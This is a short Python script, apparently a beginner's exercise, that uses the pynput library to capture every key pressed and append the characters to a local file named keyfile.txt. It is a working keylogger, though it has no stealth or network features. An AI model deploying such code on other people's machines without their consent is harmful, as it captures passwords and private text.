"""This script tracks clicks on the keyboard and creates a txt file to track
every keystroke"""

#imports the keyboard function from the pynput library
from pynput import keyboard


#defining the keypressed function
def keyPressed(key):
    print(str(key))
    #create a text file named keyfile.txt
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)

            #if an issue comes up, print this message
        except:
            print("Error getting the characters")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
